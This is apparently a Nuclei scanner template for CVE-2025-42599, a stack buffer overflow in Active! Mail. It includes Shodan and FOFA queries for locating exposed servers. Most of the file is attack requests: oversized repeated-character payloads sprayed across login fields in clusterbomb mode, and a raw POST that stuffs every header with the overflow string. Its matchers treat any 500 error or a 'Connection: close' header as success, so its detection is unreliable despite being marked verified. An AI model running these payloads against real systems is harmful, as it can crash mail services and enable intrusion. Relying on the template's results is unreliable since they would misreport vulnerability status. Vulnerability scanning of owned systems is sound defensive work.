id: CVE-2025-42599

info:
  name: Active! Mail - Stack-Based Buffer Overflow
  author: pdresearch
  severity: critical
  description: |
    Active! Mail version 6.60.05008561 and earlier contains a stack-based buffer overflow vulnerability that allows remote unauthenticated attackers to execute arbitrary code or cause a denial-of-service (DoS) by sending specially crafted requests. The vulnerability is triggered when the application processes certain malformed requests, which overflow a stack buffer.
  impact: |
    Successful exploitation of this vulnerability could allow remote attackers to execute arbitrary code with the privileges of the Active! Mail service, potentially leading to full system compromise, or cause the service to crash resulting in denial-of-service.
  remediation: |
    Update Active! Mail to version 6.60.05008562 or later. If immediate update is not possible, consider implementing network-level protections and monitoring for suspicious activity targeting the mail service.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-42599
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-42599
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-42599
    cwe-id: CWE-121
    epss-score: 0.95000
    epss-percentile: 0.99950
    cpe: cpe:2.3:a:active_mail:active_mail:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: active_mail
    product: active_mail
    shodan-query: 'product:"Active! Mail"'
    fofa-query: 'app="Active!-Mail"'
  tags: cve,cve2025,active-mail,overflow,bof,rce,kev,mail

variables:
  # Payload for triggering the buffer overflow
  overflow_payload: "{{repeat('A', 1024)}}"
  # Alternative payload with different patterns
  pattern_payload: "{{repeat('B', 512)}}{{repeat('C', 512)}}"
  # Extended payload for deeper overflow
  extended_payload: "{{repeat('D', 2048)}}"

http:
  # First request - Basic detection and version check
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/mail/"
      - "{{BaseURL}}/webmail/"

    matchers:
      - type: word
        part: body
        words:
          - "Active! Mail"
          - "ActiveMail"
          - "active-mail"
        condition: or

      - type: regex
        part: body
        regex:
          - "(?i)Active!\\s*Mail\\s*([\\d\\.]+)"
          - "(?i)Version:\\s*([\\d\\.]+)"

    extractors:
      - type: regex
        part: body
        name: version
        group: 1
        regex:
          - "(?i)Active!\\s*Mail\\s*([\\d\\.]+)"
          - "(?i)Version:\\s*([\\d\\.]+)"

  # Second request - Attempt to trigger buffer overflow via POST
  - method: POST
    path:
      - "{{BaseURL}}/mail/login"
      - "{{BaseURL}}/webmail/login"
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/auth"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    payloads:
      username:
        - "{{overflow_payload}}"
        - "{{pattern_payload}}"
        - "{{extended_payload}}"
      password:
        - "{{overflow_payload}}"
        - "{{pattern_payload}}"
        - "{{extended_payload}}"
      email:
        - "{{overflow_payload}}@test.com"
        - "{{pattern_payload}}@test.com"
        - "{{extended_payload}}@test.com"

    attack: clusterbomb

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 500'
          - 'status_code == 502'
          - 'status_code == 503'
          - 'contains(body, "Internal Server Error")'
          - 'contains(body, "Application Error")'
          - 'contains(body, "Server Error")'
          - 'contains(body, "Buffer")'
          - 'contains(body, "Overflow")'
          - 'contains(body, "Stack")'
        condition: or

      - type: word
        part: header
        words:
          - "Connection: close"
          - "Connection: Close"

  # Third request - Alternative overflow trigger via malformed headers
  - raw:
      - |
        POST /mail/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{len(overflow_payload)}}
        X-Forwarded-For: {{overflow_payload}}
        User-Agent: {{overflow_payload}}
        Accept: {{overflow_payload}}
        Accept-Language: {{overflow_payload}}
        Accept-Encoding: {{overflow_payload}}
        Connection: close

        username={{overflow_payload}}&password={{overflow_payload}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code >= 500'
          - 'status_code == 0'
          - 'contains(body, "Internal Server Error")'
          - 'contains(body, "Application Error")'
          - 'contains(body, "Server Error")'
          - 'contains(body, "Buffer")'
          - 'contains(body, "Overflow")'
          - 'contains(body, "Stack")'
          - 'contains(body, "Segmentation fault")'
          - 'contains(body, "Access violation")'
        condition: or

      - type: word
        part: header
        words:
          - "Connection: close"
          - "Connection: Close"

    extractors:
      - type: regex
        part: body
        name: error_details
        regex:
          - "(?i)(Internal Server Error|Application Error|Server Error|Buffer|Overflow|Stack|Segmentation fault|Access violation)"
          - "(?i)(Error\\s+\\d+|Exception\\s+\\w+)"

# digest: 490a0046304402202bb9c49bbd0a1f29f07003eb92c55fb261c7030b56a1761d548c7bb5939690c002203e8f3a50a253c5f031c332404f3ce89192f3c5cd946f682e98099545e91f0440:922c64590222798bb761d5b6d8e72950
